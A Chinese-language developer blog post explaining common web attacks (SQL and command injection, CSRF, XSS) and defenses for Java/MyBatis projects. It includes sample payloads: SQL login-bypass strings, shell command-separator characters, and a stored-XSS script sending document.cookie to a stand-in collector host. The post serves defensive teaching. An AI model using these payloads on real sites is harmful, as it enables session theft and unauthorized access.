<div class="catalog">

- [前言](#t1)
- [OWASP](#t2)
- [注入攻击](#t3)
- [CSRF 攻击](#t4)
- [XSS 攻击](#t5)
- [参考文章](#te)


</div>

## <span id="t1">前言</span>

在开始准备这一章的时候，对应用安全的理解仅限于依赖升级、SQL注入等。也是新项目要上线，才开始考虑这方面内容，基本上就是疯狂看大佬的总结（抄作业）。

所以，先把跟了好久的大佬先放上：<a href="https://www.pdai.tech/" target="_blank">Java 全栈知识体系 (pdai.tech)</a>

安全部分计划分为两篇：**开发安全（漏洞和原理）** 和 **漏洞测试（软件和测试平台）** 

<br/>

这里先汇总常见的攻击方式：

**OWASP（开放式web应用程序安全项目）**

- 这个应用安全项目有许多成果，"十大安全隐患列表"最为有名。它的报告列举了最常见的漏洞和修补方法。

**注入攻击**

- 注入攻击最为常见的攻击方式，作为开发而言必须完全避免，主要包括：`SQL 注入`, `xPath 注入`, `命令注入`, `LDAP注入`, `CLRF注入`, `Host头注入`, `Email头注入`等等。

**CSRF 攻击**

- CSRF（Cross-site request forgery）跨站请求伪造。它可以通过攻击，盗用了你的身份，以你的名义发送恶意请求。

**XSS 攻击**

- XSS 是跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。



<br/>

## <span id="t2">OWASP</span>



OWASP 已完成项目索引：<a href="http://www.owasp.org.cn/OWASP-CHINA/owasp-project/" target="_">项目介绍 — OWASP-CHINA</a>

截至目前（2021.9.23），最新版的“10大漏洞”依然是2017版，应该快要出新版了。

- 官方在线版：[OWASP Top 10 - 2017](http://www.owasp.org.cn/OWASP-CHINA/owasp-project/OWASPTop102017v1.1.pdf)
- 2017版下载备用地址：[OWASPTop102017v1.1.pdf](https://gitee.com/pic_bed_of_shiva/static-resources/blob/26d29676bf65626088949add19db8684fa083808/showns/file/OWASPTop102017v1.1.pdf)

这部分文档有说明，而且和后续部分有相当重叠，看文档就行。

<br/>

## <span id="t3">注入攻击</span>

注入攻击最为常见的攻击方式，作为开发而言 **必须完全避免** 。几种不同注入，本质相同，防护方式也类似。



### SQL 注入

> SQL 注入就是通过将 SQL 命令插入应用程序的 http 请求中，并在服务器端被接收后用于参与数据库操作，最终达到欺骗服务器执行恶意的 SQL 命令的效果。

理论上来讲，应用程序中只要是与数据库有数据交互的地方，无论是增删改查，如果数据完全受用户控制，而应用程序又处理不当，那么这些地方都是可能存在 SQL 注入的。



#### 漏洞原因

SQL 注入需要有以下条件：

- **使用了字符串拼接的方式构造 SQL 语句**
- 不安全的数据库配置，比如对查询集不合理处理，对sql查询语句错误时不当的处理，导致其错误信息暴露在前端
- 过于信任用户在前端所输入的数值，没有过滤用户输入的恶意数据，直接把用户输入的数据当做SQL语句执行

例如在 JDBC 下，字符串拼接 sql：

```java
Statement s = conn.createStatement();
String sql = "select id, username, password from sys_user where username= '" + username + "' and password= '" + password + "'";
s.execute(sql);
```

 若不对参数进行校验，就可能存在以下sql：

```sql
select id, username, password from sys_user where username= 'admin'#' and password= '123456'
select id, username, password from sys_user where username= 'admin'--' and password= '123456'
```

通过注释将密码忽略，从而绕过验证。也有其他的注入方式如： `or 1=1` 等，不过都类似。



#### 防护措施

其实也不用防护，现在哪里还有人拼 `SQL` ，mybatis 不香吗？该做的框架其实都做好了。。。

1. **预编译。在 mybatis xml 场景下，使用 `#{}` 来传递参数。**

`#{}` 会把传入的数据都当成一个字符串，会对自动传入的数据加一个双引号。例如：`where username="111"`

`${}` 则将传入的数据直接显示生成在sql中，如：`where username=111` 。这种方式会存在 sql注入风险。

所以，传入参数时必须使用`#{}` 。但是在动态表名、列名时可以需要使用 `${}` ，如：

```sql
 select * from ${tableName} where id = ${id}
```

2. **输入验证，检查用户输入的合法性，以确保输入的内容为正常的数据** 。数据检查应当在客户端和服务器端都执行。

- 客户端校验减轻服务器压力，提高用户友好度。但是抓包可以修改，不可作为最终参数。
- 服务端对参数进行校验，对进入数据库的特殊字符（'"\尖括号&*;等）进行转义处理，或编码转换。


3. **错误消息处理，不能将 SQL 错误消息返回到前端** ，例如：类型错误、字段不匹配等。
4. **加密处理**，这个比较通俗，数据库内对登陆密码这些超敏感数据，不可能保存明文。
5. 在测试阶段，建议使用专门的 SQL 注入检测工具进行检测。网上有很多这方面的开源工具，例如 sqlmap、SQLninja 等。



### 命令注入

> 命令是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。

Java中 `System.Runtime.getRuntime().exec(cmd);` 可以在目标机器上执行命令，而构建参数的过程中可能会引发注入攻击。

在目前遇到过的项目里，倒是没有需要传入命令进行执行的场景。了解下就行了。

```java
String command = "xxxx xxx xxx";
Runtime run = Runtime.getRuntime();
Process process = run.exec(command);
```

常见的注入方式，其实就是 shell 根据命令来找的漏洞：

- “；” 分割
- “&”，“&&”，“||” 分割
- “|” 管道符
- `\r\n %d0%a0` 换行
- `$()` 替换



上面两个其实也都差不多，都是通过各自的语法来找漏洞。其他的一些 `xPath 注入` 、`LDAP 注入` 、`CLRF注入` 、`Host头注入` ，都差不多。





<br/>

## <span id="t4">CSRF 攻击</span>

CSRF 是一种危害非常大的攻击，又很难以防范。目前几种防御策略虽然可以很大程度上抵御 CSRF 的攻击，但并没有一种完美的解决方案。

原理如下图所示，也不难理解：

![img](https://gitee.com/pic_bed_of_shiva/picture/raw/master/images/2009040916453171.jpg)

![img](https://gitee.com/pic_bed_of_shiva/picture/raw/master/images/4099767-4e373b4cb613207b.png)



由于浏览器自带的安全防护，黑客网站也无法获得客户的 cookie。但是攻击者可以通过 JS，发起特定的请求信息。

> 所以 CSRF 的核心，不是拿到用户的认证信息，而是借用认证信息，发出特定请求。对服务端而言，因为无法识别请求来源，从而执行。



```java
// 这里没有限制POST Method，导致用户可以不通过POST请求提交数据。
@RequestMapping("/url")
public ReponseData saveSomething(XXParam param){
    // 数据保存操作...
}
```

这在接口规范中也有说明，幂等性、GET 作为查询、POST 修改数据等，不过在实际开发中容易忘。



### 防护措施

1. **验证`HTTP Referer`字段**

HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。

对敏感操作请求的 Referer 进行判断，也算是一道防护。

- 优点：使用方便，开发简单，一定程度上能预防CSRF攻击；
- 缺点：这种机制完全依托于浏览器，Referer字段容易被故意篡改，或者被禁用。

2. **请求中添加token并验证**

token 就是服务端颁发给客户端的一长串字符串。

> csrf 依赖于浏览器该问链接时自动对应网站的cookie带上，所以 token 不放 cookie 里，可以作为 query 参数每次携带，在处理请求前进行 token 验证即可。

在基于没有其他漏洞会泄漏本次会话的token的设想下 ，黑客是无法获取用户的 token，**所以一次会话可以使用同一个 token。**

- 优点：安全程度比 Referer 的方式要高；
- 缺点：实现方式上稍微复杂（GET需要拼接链接，POST需要使用JS添加参数）；需要保证 token 存储的安全性。

3. **在 HTTP 头中自定义属性并验证**

这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。

通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。

- 优点：使用方式较简单，而且token不容易泄露
- 缺点：使用场合较少，在 Ajax 方法才可以使用，局限性较大。



<br/>

## <span id="t5">XSS 攻击</span>

XSS 是跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。



### 攻击类型

#### 反射型 XSS

> 反射性xss 一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。

比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 "反射"到受害者的浏览器上，从而浏览器就执行了该脚本。

![img](https://gitee.com/pic_bed_of_shiva/picture/raw/master/images/dev-security-xss-1.png)

因此反射型XSS的攻击步骤如下：

1. 攻击者在url后面的参数中加入恶意攻击代码。
2. 当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。
3. 用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。
4. 攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户的行为，调用目标网站接口执行攻击等操作。





#### 存储型 XSS

> 主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。

![img](https://gitee.com/pic_bed_of_shiva/picture/raw/master/images/dev-security-xss-3.png)

```javascript
<script>window.open("cookies.shouji.com?param="+document.cookie)</script>
```

例如，我在一个博客中嵌入如下js，那么浏览博客的用户打开后，将会执行。

1. 攻击者将恶意代码提交到目标网站数据库中。
2. 用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。
3. 用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。
4. 那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。



防护措施：

- 后端需要对提交的数据进行过滤。
- 前端也可以做一下处理方式，比如对script标签，将特殊字符替换成HTML编码这些等。





#### DOM型 XSS

> 基于DOM的XSS攻击是反射型攻击的变种。服务器返回的页面是正常的，只是我们在页面执行js的过程中，会把攻击代码植入到页面中。



![img](https://gitee.com/pic_bed_of_shiva/picture/raw/master/images/dev-security-xss-2.png)





1. 攻击者构造出特殊的URL、在其中可能包含恶意代码。例如：`http://xxx?name=<script>alert('aaa')</script>`
2. 用户打开带有恶意代码的URL。
3. 用户浏览器收到响应后解析执行。前端使用js取出url中的恶意代码并执行。
4. 执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口执行攻击者一些操作。



<br/>



### 防御方式

XSS 攻击其实就是代码的注入。用户的输入被编译成恶意的程序代码。所以，为了防范这一类代码的注入，需要确保用户输入的安全性。对于攻击验证，我们可以采用以下两种措施：

- **编码，就是转义用户的输入，把用户的输入解读为数据而不是代码**
- **校验，对用户的输入及请求都进行过滤检查，如对特殊字符进行过滤，设置输入域的匹配规则等**。

具体比如：

- **对于验证输入**，我们既可以在`服务端验证`，也可以在`客户端验证`
- **对于持久性和反射型攻击**，`服务端验证`是必须的，服务端支持的任何语言都能够做到
- **对于基于DOM的XSS攻击**，验证输入在客户端必须执行，因为从服务端来说，所有发出的页面内容是正常的，只是在客户端js代码执行的过程中才发生可攻击
- 但是对于各种攻击方式，**我们最好做到客户端和服务端都进行处理**。

其它还有一些辅助措施，比如：

- **入参长度限制**： 通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。
- 设置cookie httponly为true（具体请看下文的解释）

具体方式如下：

#### escapeHTML

- 前端：

```javascript
// util封装可以参考 HTMLParser.js, 或者自己封装
util.escapeHtml(html);    
```

- 后端， 推荐使用ApacheCommon包下 `StringEscapeUtils` – 用于正确处理转义字符，产生正确的Java、JavaScript、HTML、XML和SQL代码；

```java
// encode html
System.out.println(StringEscapeUtils.escapeHtml("<a>abc</a>"));
System.out.println(StringEscapeUtils.unescapeHtml("&lt;a&gt;abc&lt;/a&gt;"));

// encode js
System.out.println(StringEscapeUtils.escapeJavaScript("<script>alert('123')<script>"));
System.out.println(StringEscapeUtils.unescapeJavaScript("<script>alert(\'123\')<script>"));
```

#### 过滤或者校验



校验是一种过滤用户输入以至于让代码中恶意部分被移除的行为。校验都是通过一定的经验和规则，对用户的输入进行匹配，过滤，去除掉存在攻击风险的部分。

我们可以通过黑名单的方式和白名单的方式来设置我们的规则，对用户提交的数据进行有效性验证，仅接受符合我们期望格式的内容提交，阻止或者忽略除此外的其他任何数据。

- **黑名单** 我们可以把某些危险的标签或者属性纳入黑名单，过滤掉它。
- **白名单** 这种方式只允许部分标签和属性，不在这个白名单中的，一律过滤掉它。

这里举个例子，**富文本的防御**: 富文本的情况非常的复杂，js可以藏在标签里，超链接url里，何种属性里。

```js
<script>alert(1)</script>
<a href="javascript:alert(1)"></a>
<img src="abc" onerror="alert(1)"/>
```

所以我们不能过用上面的方法做简单的转义, 因为情况实在太多了。思路就是黑白名单校验，这里提供一个包，帮助我们去解析html树状结构，它使用起来和jquery非常的类似。

```js
npm install cheerio --save
```

```js
var xssFilter = function(html) {
    if(!html) return '';
    var cheerio = require('cheerio');
    var $ = cheerio.load(html);
    //白名单
    var whiteList = {
        'html' : [''],
        'body' : [''],
        'head' : [''],
        'div' : ['class'],
        'img' : ['src'],
        'a' : ['href'],
        'font':['size','color']
    };

    $('*').each(function(index,elem){
        if(!whiteList[elem.name]) {
            $(elem).remove();
            return;
        }
        for(var attr in elem.attribs) {
            if(whiteList[elem.name].indexOf(attr) === -1) {
                $(elem).attr(attr,null);
            }
        }

    });

    return $.html();
}

console.log(xssFilter('<div><font color="red">你好</font><a href="http://www.baidu.com">百度</a><script>alert("哈哈你被攻击了")</script></div>'));
```

#### CSP(Content Security Policy)

内容安全策略（Content Security Policy，简称CSP）是一种以可信白名单作机制，来限制网站中是否可以包含某来源内容。

CSP对你用于浏览页面的浏览器做出了限制，以确保它只能从可信赖来源下载的资源。资源可以是脚本，样式，图片，或者其他被页面引用的文件。这意味着即使攻击者成功的在你的网站中注入了恶意内容，CSP也能免于它被执行。

默认配置下不允许执行内联代码（``块内容，内联事件，内联样式），以及禁止执行eval() , newFunction() , setTimeout([string], ...) 和setInterval([string], ...) 。

- 只允许本站资源

```js
Content-Security-Policy： default-src ‘self’
```

- 允许本站的资源以及任意位置的图片以及 其他网站下的脚本。

```js
Content-Security-Policy： default-src ‘self’; img-src *;
script-src https://shiva.show
```







<br/>

## <span id="te">参考文章

[♥开发安全相关知识体系详解♥ | Java 全栈知识体系 (pdai.tech)](https://www.pdai.tech/md/develop/security/dev-security-overview.html)

[什么是 SQL 注入？怎么进行 ？如何防范 ？ (qq.com)](https://mp.weixin.qq.com/s?__biz=Mzg2MjEwMjI1Mg==&mid=2247486948&idx=1&sn=c29d9ea1041c3dae935b52f8b8c360aa&chksm=ce0dba67f97a33713f65488e9f0332bdc9934f3e4e557867a175dbdad132c123a9f5c11d0d15&scene=21#wechat_redirect)

[sql注入---入门到进阶_春日野穹-CSDN博客_sql注入条件](https://blog.csdn.net/chest_/article/details/102537988)

[mybatis是如何防止SQL注入的 - 王的微笑 - 博客园 (cnblogs.com)](https://www.cnblogs.com/jokmangood/p/11705850.html)

[Mybatis是这样防止sql注入的 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/102151012)

[浅谈CSRF攻击方式 - hyddd - 博客园 (cnblogs.com)](https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html)

[web安全:CSRF攻击原理以及防御 - 简书 (jianshu.com)](https://www.jianshu.com/p/ffb99fc70646)

[CSRF 攻击详解 - 程序员自由之路 - 博客园 (cnblogs.com)](https://www.cnblogs.com/54chensongxia/p/11693666.html)

[web安全之XSS攻击原理及防范 - 龙恩0707 - 博客园 (cnblogs.com)](https://www.cnblogs.com/tugenhua0707/p/10909284.html)
